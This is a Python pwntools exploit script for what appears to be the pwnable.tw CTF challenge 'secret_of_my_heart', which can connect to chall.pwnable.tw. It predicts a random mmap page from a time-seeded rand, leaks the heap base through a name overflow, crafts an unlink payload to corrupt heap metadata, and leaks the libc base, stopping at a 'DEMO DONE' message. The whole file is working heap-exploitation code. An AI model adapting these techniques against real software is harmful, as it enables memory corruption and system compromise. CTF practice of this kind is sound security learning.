from pwn import *
from ctypes import CDLL
import sys,time

context.arch =  'amd64'
elf 	= ELF('./secret_of_my_heart')
status 	= sys.argv[1]
randn	= 0
info("Preview mmap_space by time(0)")

def loadProgram(libcname,program):
    global libc,pylib,io
    libc  = ELF(libcname)
    pylib = CDLL(libcname)
    io    = process(program,env = {"LD_PRELOAD":libcname})

if status == 'd':
    context.log_level = "debug"
    loadProgram("./libc_64.so.6","./secret_of_my_heart")
    pylib.srand(int(time.time()))
    while randn <= 0x10000:
        randn = pylib.rand() & 0xfffff000
elif status == 'l':
    loadProgram("/lib/x86_64-linux-gnu/libc-2.23.so","./secret_of_my_heart")
    pylib.srand(int(time.time()))
    while randn <= 0x10000:
        randn = pylib.rand() & 0xfffff000
elif status == 'r':
    libcname = "./libc_64.so.6"
    libc  = ELF(libcname);	pylib = CDLL(libcname)
    io    = remote('chall.pwnable.tw',10302)
    pylib.srand(int(time.time()))
    while randn <= 0x10000:
        randn = pylib.rand() & 0xfffff000
else:
    info("INVALID STATUS")
    exit()
info("PAGE = %#x"%randn)

def add(size, name, cont):
    io.sendlineafter(" :", "1")
    io.sendlineafter(" : ", str(size))
    io.sendafter(" :", name)
    io.sendafter(" :", cont)

def show(idx):
    io.sendlineafter(" :", "2")
    io.sendlineafter(" :", str(idx))

def delete(idx):
    io.sendlineafter(" :", "3")
    io.sendlineafter(" :", str(idx))

add(0x60,'a'*0x18+'C0ss4ck!','xixi')
show(0)
io.recvuntil('C0ss4ck!')
heap_base = u64(io.recv(6).ljust(8,'\x00'))-0x10
info('HEAP BASE -> %#x'%heap_base)
add(0xf8,'aaaa','haha')
add(0x20,'aaaa','haha')
delete(0)
evil_ptr = randn+0x18
unlink_payload = p64(evil_ptr-0x18)+p64(evil_ptr-0x10)
unlink_payload = unlink_payload.ljust(0x60,'\x00')
unlink_payload += p64(0x70)
add(0x68,p64(0)*2+p64(heap_base),unlink_payload)
delete(1)
show(0)
io.recvuntil('Secret : ')
libc_base = u64(io.recv(6).ljust(8,'\x00'))-88-(libc.sym['__malloc_hook']+0x10)
info('LIBC BASE -> %#x'%libc_base)

info("DEMO DONE")
